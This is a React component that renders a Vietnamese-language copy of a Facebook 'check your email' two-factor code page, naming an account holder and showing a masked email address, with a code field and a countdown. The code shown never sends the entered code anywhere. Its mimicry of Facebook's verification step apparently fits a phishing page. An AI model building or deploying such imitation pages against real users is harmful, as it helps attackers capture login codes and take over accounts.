
import { Link } from 'react-router-dom';
import './main.scss';
import React, { useState } from 'react';

function FactorAuthen() {
    const [code, setCode] = useState('');
    const [timer, setTimer] = useState(5);

    // Giả lập countdown
    React.useEffect(() => {
        if (timer > 0) {
            const countdown = setTimeout(() => setTimer(timer - 1), 1000);
            return () => clearTimeout(countdown);
        }
    }, [timer]);

    const handleCodeChange = (e) => {
        setCode(e.target.value);
    };
        
    return (
        <div className="container-fator">
            <div className="modal-content-fator">
                <p className="modal-title">Thuy Trang - Facebook</p>
                <h3>Kiểm tra email của bạn</h3>
                <p className="modal-subtitle">
                    Nhập mã chúng tôi đã gửi đến h**********3@f**.e**.vn
                </p>
                <input
                    type="text"
                    className="input-code"
                    placeholder="Mã"
                    value={code}
                    onChange={handleCodeChange}
                />
                <div className="timer-text">
                    <input type="checkbox" id="checkbox" disabled />
                    <label htmlFor="checkbox">
                        Chúng tôi có thể gửi mã mới sau {`0:${timer < 10 ? `0${timer}` : timer}`}
                    </label>
                </div>
                <button className="btn-continue" disabled={timer > 0}>Tiếp tục</button>
                {/* <button className="btn-other">Thử cách khác</button> */}
            </div>
        </div>
    );
  }
  
  export default FactorAuthen;